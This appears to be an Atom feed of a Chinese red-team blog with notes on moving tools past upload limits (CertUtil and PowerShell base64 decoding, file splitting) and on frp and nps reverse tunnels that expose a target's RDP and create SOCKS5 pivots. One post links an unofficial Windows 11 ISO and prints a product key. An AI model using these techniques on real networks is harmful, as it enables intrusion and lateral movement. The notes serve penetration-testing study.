<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2021-07-01T13:23:56.199Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
    <link href="https://www.teamssix.com/year/210701-161347.html"/>
    <id>https://www.teamssix.com/year/210701-161347.html</id>
    <published>2021-07-01T08:13:47.000Z</published>
    <updated>2021-07-01T13:23:56.199Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre><code>$PEBytes = [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload = [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload</code></pre><p>使用 PowerShell 进行 base64 解码</p><pre><code>$Base64Bytes = Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre><code>CertUtil -encode fscan.exe fscan_base64.txt</code></pre><p>使用 CertUtil 进行解码</p><pre><code>CertUtil -decode fscan_base64.txt fscan_base64.exe</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png"> </p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a></p><p><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、前言&quot;&gt;&lt;a href=&quot;#1、前言&quot; class=&quot;headerlink&quot; title=&quot;1、前言&quot;&gt;&lt;/a&gt;1、前言&lt;/h2&gt;&lt;p&gt;有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe </summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】两种突破内网中无法上传大文件的方法</title>
    <link href="https://www.teamssix.com/year/20210630-113201.html"/>
    <id>https://www.teamssix.com/year/20210630-113201.html</id>
    <published>2021-06-30T03:32:01.000Z</published>
    <updated>2021-06-30T03:38:23.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p><p>在前段时间就碰到了这个问题，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败，在此简单记录下当时解决的办法。</p><p>针对这种情况，就需要将大文件变成小文件后再进行上传，个人觉着可以简单的分为两种方式，一种是常规的压缩文件一种是分割文件，先来看看第一种方法。</p><h1 id="0x01-压缩文件"><a href="#0x01-压缩文件" class="headerlink" title="0x01 压缩文件"></a>0x01 压缩文件</h1><p>这里以 7-Zip 为代表，其他的压缩软件还有 WinRAR 等，7-Zip 文件下载地址：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p>如果目标主机没有安装 7-Zip，可以现在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe 拷贝到目标主机上，默认路径为「C:\Program Files\7-Zip\7z.exe」。</p><p>7z.exe 只有 400 多 K 的大小，可以说很是小巧了，以下为 7z.exe 的常用命令。</p><pre><code> a     添加压缩文件 x     解压压缩文件 -p    指定密码 -v    分卷压缩 -r    递归压缩 -o    指定输出目录</code></pre><h3 id="普通的压缩-解压文件"><a href="#普通的压缩-解压文件" class="headerlink" title="普通的压缩/解压文件"></a>普通的压缩/解压文件</h3><p>把 fscan.exe 压缩成 fscan.7z，压缩密码为『teamssix.com』</p><pre><code>7z.exe a -pteamssix.com fscan.7z fscan.exe</code></pre><pre><code>C:\7-Zip&gt;7z.exe a -pteamssix.com fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok</code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre><code>7z.exe x -pteamssix.com fscan.7z</code></pre><pre><code>C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 2794266 bytes (2729 KiB)Extracting archive: fscan.7z--Path = fscan.7zType = 7zPhysical Size = 2794266Headers Size = 170Method = LZMA2:3m BCJ 7zAESSolid = -Blocks = 1Everything is OkSize:       2911744Compressed: 2794266</code></pre><p>fscan.7z 的大小是 2729 KB，fscan.exe 的大小是 2844 KB，可以看到其实大小差别也不大，没能达到我们将大文件变成小文件的目的，这种大小上传可能还是会失败，那再来试试分卷上传。</p><h3 id="分卷压缩-解压文件"><a href="#分卷压缩-解压文件" class="headerlink" title="分卷压缩/解压文件"></a>分卷压缩/解压文件</h3><p>分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。</p><p>把 fscan.exe 以 500 K 大小进行分卷压缩。</p><pre><code>7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe</code></pre><pre><code>C:\7-Zip&gt;7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok</code></pre><pre><code>C:\7-Zip&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 2C2C-615D C:\7-Zip 的目录2021/06/29  21:42    &lt;DIR&gt;          .2021/06/29  21:42    &lt;DIR&gt;          ..2021/05/06  15:00           489,472 7z.exe2021/06/29  21:40           512,000 fscan.7z.0012021/06/29  21:40           512,000 fscan.7z.0022021/06/29  21:40           512,000 fscan.7z.0032021/06/29  21:40           512,000 fscan.7z.0042021/06/29  21:40           512,000 fscan.7z.0052021/06/29  21:40           234,266 fscan.7z.0062021/06/18  14:58         2,911,744 fscan.exe               8 个文件      6,195,482 字节</code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre><code>7z.exe x -pteamssix.com fscan.7z.001</code></pre><pre><code>C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z.0017-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 512000 bytes (500 KiB)Extracting archive: fscan.7z.001--Path = fscan.7z.001Type = SplitPhysical Size = 512000Volumes = 6Total Physical Size = 2794266----Path = fscan.7zSize = 2794266--Path = fscan.7zType = 7zPhysical Size = 2794266Headers Size = 170Method = LZMA2:3m BCJ 7zAESSolid = -Blocks = 1Everything is OkSize:       2911744Compressed: 2794266</code></pre><p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。</p><p>但这样做感觉还是有些麻烦，直接使用下文的 split 进行文件分割个人觉着是更为方便的方法，使用 split 进行分割也是我个人解决前段时间碰到不能上传大文件问题时的方法。</p><h1 id="0x02-分割文件"><a href="#0x02-分割文件" class="headerlink" title="0x02 分割文件"></a>0x02 分割文件</h1><p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p><pre><code>split -b 500k fscan.exe teamssix</code></pre><p>合并分割文件为 fscan.exe</p><pre><code>cat teamssix* &gt; fscan            # 适用于 Linux、Maccopy /b teamssix* fscan.exe        # 适用于 Windows</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png"></p><p>个人觉着直接用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。&lt;/p&gt;
&lt;p&gt;在前段时</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【随笔】Windows 11 的安装尝鲜</title>
    <link href="https://www.teamssix.com/year/210616-133645.html"/>
    <id>https://www.teamssix.com/year/210616-133645.html</id>
    <published>2021-06-16T05:36:45.000Z</published>
    <updated>2021-06-16T05:40:32.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>看到网上有人发 Windows 11 的安装包，心想，咦，Windows 11 都出来了？那不赶紧下载一个来尝尝鲜。</p><p>网上流传的下载地址：<a href="http://wall4.kfire.net/win11.iso">http://wall4.kfire.net/win11.iso</a></p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>这里以 Mac 下的 VMware Fusion 安装为例，Windows 下的操作也都类似。</p><p>首先打开 <code>VMware Fusion</code>，选择<code>新建</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110553.png"></p><p>把下载好的 <code>win11.iso</code> 文件拖拽过来</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110611.png"></p><p>拖拽过来后，会来到 <code>创建新的虚拟机</code> 界面，点击继续</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110707.png"></p><p>接下来，选择操作系统，我这里选择的 <code>Windows 10 x64</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123525.png"></p><p>选择固件类型，我这里选择的 <code>传统 BIOS</code>，亲自尝试发现选择 <code>UEFI</code> 会无法启动</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111009.png"></p><p>接下来，虚拟机就创建完成了，但是默认分配的内存有点低，因此可以点击 <code>自定设置</code>，自己调一下配置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616132656.png"></p><p>点击 <code>自定设置</code>后，可以修改个名字，我这里修改成了 <code>windows11</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111717.png"></p><p>点击 <code>存储</code> 后，会自动打开设置界面，这里我修改了两个地方，分别是 <code>处理器和内存</code> 和 <code>硬盘（IDE）</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111813.png"></p><p>打开 <code>处理器和内存</code>，我这里分配了 4 个处理器内核和 4096 MB 的内存</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111940.png"></p><p>点击 <code>显示全部</code>，点击 <code>硬盘（IDE）</code>，我这里分配了 50 G</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112125.png"></p><p>修改磁盘大小后，点击 <code>应用</code> ,然后关闭设置这个窗口，点击这个大大的启动按钮</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112229.png"></p><p>启动后，可以看到 Windows 11 新的 logo</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112434.png"></p><p>这个镜像里没有中文，所以就直接用默认的英文了，点击 <code>Next</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112615.png"></p><p>点击 <code>Install now</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112619.png"></p><p>接下来需要输入激活码，这里有个 Windows 11 Pro 的激活码：</p><pre><code>FKNPR-6C4GH-R3292-P4RTJ-GVJWB</code></pre><p>输入激活码，<code>Next</code> 下一步</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123715.png"></p><p>勾选同意，<code>Next</code> 即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113117.png"></p><p>选择 <code>Custom</code>，自定义安装</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113230.png"></p><p><code>New</code> 一个分区，点击 <code>New</code> 后，再点击 <code>Apply</code> 应用一下，不过貌似直接 <code>Next</code> 也可以</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113639.png"></p><p>点击 <code>Apply</code>后会有个通知，点击确认就行， 然后点击 <code>Next</code> 就开始安装了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113826.png"></p><p>接下来，等它安装完成就行了。</p><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>安装完成后，选择国家和地区，这里选择了中国</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123935.png"></p><p>选择键盘布局，这里就直接默认了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124044.png"></p><p>询问是否要再添加一个键盘，这里就直接跳过了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124155.png"></p><p>接下来，系统会检查更新，检查完成后，输入自己的名字</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124458.png"></p><p>然后输入密码，之后再设置三个安全问题，接受隐私协议，最后等待几分钟</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124739.png"></p><p>最后，就进入桌面了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124854.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616125657.png"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>单纯就外观来看，变化不算小，而且窗口的打开关闭也有了动画过渡，UI 变得更好看了，同时操作逻辑还是原来的逻辑，上手也不会有什么难度，值得一提的是，目前还没遇到什么 bug，这点挺不错的。</p><p>但是再多打开几个窗口，比如说 CMD、计算机管理什么的，还是可以看到很多当年 Win7 的影子，看来 Win11 依然还是一个两种设计语言并存的系统。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616130923.jpg"></p><p>从最早的 xp，到 7、8、10 一直到 11 ，不得不说 Windows 确实是变得越来越好看了，现在的 Windows 给我的感觉就是微软有品味了但又不完全有，希望 Windows 继续努力吧，我还是继续用我的 Mac 了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;看到网上有人发 Windows 11 的安装包，心想，咦，Windows 11 都出来了？那不赶紧下</summary>
      
    
    
    
    <category term="随笔" scheme="https://www.teamssix.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="Windows 11" scheme="https://www.teamssix.com/tags/Windows-11/"/>
    
    <category term="尝鲜" scheme="https://www.teamssix.com/tags/%E5%B0%9D%E9%B2%9C/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】12、nps 的使用</title>
    <link href="https://www.teamssix.com/year/210612-213704.html"/>
    <id>https://www.teamssix.com/year/210612-213704.html</id>
    <published>2021-06-12T13:37:04.000Z</published>
    <updated>2021-06-12T13:45:48.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p><p>nps 和 frp 一样功能都很多，这里就主要记录下平时经常用到的 SOCKS5 代理模式。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例。</p><p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p><pre><code>tar -zxvf linux_amd64_server.tar.gz./nps install</code></pre><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>官方使用文档：<a href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p><p>启动服务端，默认 Web 管理界面端口 8080 </p><pre><code>nps start</code></pre><p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609170306.png"></p><p>nps 的使用也很简单，界面语言也可选择中文。</p><p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609171610.png"></p><p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172254.png"></p><p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172144.png"></p><p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172512.png"></p><p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609173211.png"></p><p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p><blockquote><p>参考文章：</p><p><a href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;nps 项目地址：&lt;a href=&quot;https://github.com/ehang-io/nps&quot;&gt;https://git</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】11、frp 的使用</title>
    <link href="https://www.teamssix.com/year/210611-171526.html"/>
    <id>https://www.teamssix.com/year/210611-171526.html</id>
    <published>2021-06-11T09:15:26.000Z</published>
    <updated>2021-06-20T13:27:29.734Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p><p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p><h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p><blockquote><p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p></blockquote><h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p><p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p><pre><code>[common]bind_port = 4444</code></pre><p>然后启动服务端</p><pre><code>frps -c frps.ini</code></pre><pre><code>&gt; ./frps -c frps.ini2021/06/09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini2021/06/09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021/06/09 03:45:03 [I] [root.go:209] frps started successfully</code></pre><p>配置客户端配置文件</p><pre><code>[common]# 服务端 IPserver_addr = vps_ip# 服务端端口server_port = 4444[rdp]type = tcplocal_ip = 127.0.0.1local_port = 3389# 连接 vps 的端口remote_port = 3389</code></pre><pre><code>&gt; .\frpc.exe -c frpc.ini2021/06/09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021/06/09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021/06/09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success</code></pre><p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png"></p><h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p><p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p><p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p><p>在 VPS 上开启服务端，服务端配置文件如下：</p><pre><code>[common]bind_port = 4444# 客户端认证 tokentoken = 123456# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码dashboard_port = 8000dashboard_user = admindashboard_pwd = password</code></pre><blockquote><p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p></blockquote><p>配置好文件后，启动服务端</p><pre><code>frps -c frps.ini</code></pre><pre><code>./frps -c frps.ini2021/06/09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini2021/06/09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021/06/09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:80002021/06/09 04:06:35 [I] [root.go:209] frps started successfully</code></pre><p>配置客户端文件</p><pre><code>[common]server_addr = vps_ipserver_port = 4444# 客户端认证 token，需要和服务端 token 保持一致token = 123456# 启用加密，防止流量被拦截use_encryption = true# 启用压缩，提升流量转发速度use_compression = true[socks5]type = tcp# 连接 vps 的端口remote_port = 1080plugin = socks5</code></pre><p>开启客户端</p><pre><code>frpc -c frpc.ini</code></pre><pre><code>&gt; .\frpc.exe -c frpc.ini2021/06/09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]2021/06/09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]2021/06/09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success</code></pre><p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161458.png"></p><p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161859.png"></p><p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a></p><p><a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。&lt;/</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】10、ew 的使用</title>
    <link href="https://www.teamssix.com/year/210610-164507.html"/>
    <id>https://www.teamssix.com/year/210610-164507.html</id>
    <published>2021-06-10T08:45:07.000Z</published>
    <updated>2021-06-10T11:51:35.914Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p><p><a href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p><p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p><p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p><p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p><p>开始之前，先理解下正向代理和反向代理的区别。</p><blockquote><p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p><p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p></blockquote><h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a 